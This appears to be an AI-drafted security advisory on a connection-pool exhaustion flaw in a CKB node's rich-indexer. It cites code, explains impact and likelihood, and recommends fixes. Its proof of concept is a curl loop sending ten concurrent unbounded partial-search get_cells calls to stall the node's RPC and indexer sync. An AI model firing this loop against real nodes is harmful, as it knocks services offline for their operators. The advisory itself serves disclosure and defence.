The code confirms all the key claims. Let me verify the pool sharing between sync and RPC paths.

All the facts check out. Here is the assessment:

---

### Title
Connection Pool Exhaustion via Unbounded `get_cells` with `Partial` Script Search Mode — (`util/rich-indexer/src/`)

### Summary
When `request_limit` is not configured, it defaults to `usize::MAX`. An unprivileged RPC caller can submit 10 concurrent `get_cells` requests with `limit=u32::MAX` and `script_search_mode=Partial`, each triggering a full-table `instr(args, $1) > 0` scan on SQLite. Because `fetch_all` holds a pool connection for the entire query duration, and the pool is capped at 10 connections with a 60-second acquire timeout, all 10 connections are exhausted. Every subsequent RPC call and every indexer-sync `append`/`rollback` operation blocks for 60 seconds before failing, stalling the indexer tip.

### Finding Description

**1. No effective `limit` cap when `request_limit` is unconfigured.**

`RichIndexerService::new` sets:
```rust
request_limit: config.request_limit.unwrap_or(usize::MAX),
``` [1](#0-0) 

The guard in `get_cells` is:
```rust
if limit as usize > self.request_limit { ... }
``` [2](#0-1) 

`u32::MAX` cast to `usize` is always `<= usize::MAX`, so the check never fires. The raw `u32::MAX` value is forwarded directly to `query_builder.limit(limit)`. [3](#0-2) 

**2. `Partial` mode on SQLite generates a non-indexed full-table scan.**

```rust
DBDriver::Sqlite => {
    query_builder.and_where(format!("instr(args, ${}) > 0", param_index));
}
``` [4](#0-3) 

`instr()` cannot use any B-tree index on `args`; SQLite must read every row in the `script` table.

**3. `fetch_all` holds the connection for the entire scan.**

```rust
let cells = self
    .store
    .fetch_all(query)
    .await
    ...
``` [5](#0-4) 

`fetch_all` materialises all rows before returning, keeping the connection checked out for the full duration of the scan. [6](#0-5) 

**4. The pool is capped at 10 connections with a 60-second acquire timeout.**

```rust
let mut pool_options = AnyPoolOptions::new()
    .max_connections(10)
    ...
    .acquire_timeout(Duration::from_secs(60))
``` [7](#0-6) 

**5. Indexer sync shares the same pool.**

`SQLXPool` wraps `Arc<OnceLock<AnyPool>>`, so every clone — including the one used by `RichIndexer::append` and `RichIndexer::rollback` — draws from the same 10-connection pool. [8](#0-7) 

`append` and `rollback` both call `self.store.transaction()`, which acquires a connection from that shared pool. [9](#0-8) 

### Impact Explanation
- All 10 pool connections are held by the attacker's long-running scans.
- Every subsequent `get_cells`, `get_transactions`, `get_cells_capacity`, and `get_indexer_tip` RPC call blocks for 60 seconds and then returns a pool-timeout error.
- `IndexerSync::append` and `rollback` also block for 60 seconds, stalling the indexer tip and preventing the node from tracking chain progress in the indexer.
- The attack is repeatable: as soon as one batch of 10 calls finishes (or times out), the attacker fires another 10.

### Likelihood Explanation
The default configuration (`request_limit` absent) is the common deployment case for operators who follow the standard CKB node setup. The RPC endpoint for indexer nodes is routinely exposed. The attack requires only 10 standard JSON-RPC calls with no authentication, no PoW, and no privileged access.

### Recommendation
1. Set a safe default for `request_limit` (e.g., `100` or `1000`) instead of `usize::MAX`.
2. Enforce a hard upper bound on `limit` independent of `request_limit` (e.g., cap at `u16::MAX`).
3. Use `fetch` (streaming) instead of `fetch_all` so connections are released row-by-row, or apply a query timeout at the SQLx layer.
4. Consider a separate, smaller connection pool for RPC queries vs. indexer-sync writes to prevent cross-contamination.

### Proof of Concept
```
# Start CKB with rich-indexer, SQLite backend, no request_limit in config.
# Fire 10 concurrent get_cells calls:
for i in $(seq 1 10); do
  curl -s -X POST http://localhost:8116 \
    -H 'Content-Type: application/json' \
    -d '{"jsonrpc":"2.0","method":"get_cells","params":[
          {"script":{"code_hash":"0x0000000000000000000000000000000000000000000000000000000000000000","hash_type":"data","args":"0x"},
           "script_type":"lock","script_search_mode":"partial"},
          "asc","0xffffffff",null],"id":'$i'}' &
done
# 11th call blocks for >=60s:
time curl -s -X POST http://localhost:8116 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"get_indexer_tip","params":[],"id":11}'
# Indexer tip also stalls — block_number does not advance during the 60s window.
```

### Citations

**File:** util/rich-indexer/src/service.rs (L51-51)
```rust
            request_limit: config.request_limit.unwrap_or(usize::MAX),
```

**File:** util/rich-indexer/src/indexer_handle/async_indexer_handle/get_cells.rs (L29-34)
```rust
        if limit as usize > self.request_limit {
            return Err(Error::invalid_params(format!(
                "limit must be less than {}",
                self.request_limit,
            )));
        }
```

**File:** util/rich-indexer/src/indexer_handle/async_indexer_handle/get_cells.rs (L156-156)
```rust
        query_builder.limit(limit);
```

**File:** util/rich-indexer/src/indexer_handle/async_indexer_handle/get_cells.rs (L229-233)
```rust
        let cells = self
            .store
            .fetch_all(query)
            .await
            .map_err(|err| Error::DB(err.to_string()))?
```

**File:** util/rich-indexer/src/indexer_handle/async_indexer_handle/mod.rs (L104-113)
```rust
        Some(IndexerSearchMode::Partial) => {
            match db_driver {
                DBDriver::Postgres => {
                    query_builder.and_where(format!("args LIKE ${}", param_index));
                }
                DBDriver::Sqlite => {
                    query_builder.and_where(format!("instr(args, ${}) > 0", param_index));
                }
            }
            *param_index += 1;
```

**File:** util/rich-indexer/src/store.rs (L29-32)
```rust
pub struct SQLXPool {
    pool: Arc<OnceLock<AnyPool>>,
    pub(crate) db_driver: DBDriver,
}
```

**File:** util/rich-indexer/src/store.rs (L46-50)
```rust
        let mut pool_options = AnyPoolOptions::new()
            .max_connections(10)
            .min_connections(0)
            .acquire_timeout(Duration::from_secs(60))
            .max_lifetime(Duration::from_secs(1800))
```

**File:** util/rich-indexer/src/store.rs (L143-149)
```rust
    pub async fn fetch_all<'a, T>(&self, query: Query<'a, Any, T>) -> Result<Vec<AnyRow>>
    where
        T: Send + IntoArguments<'a, Any> + 'a,
    {
        let pool = self.get_pool()?;
        query.fetch_all(pool).await.map_err(Into::into)
    }
```

**File:** util/rich-indexer/src/indexer/mod.rs (L156-161)
```rust
    pub(crate) async fn append(&self, block: &BlockView) -> Result<(), Error> {
        let mut tx = self
            .store
            .transaction()
            .await
            .map_err(|err| Error::DB(err.to_string()))?;
```
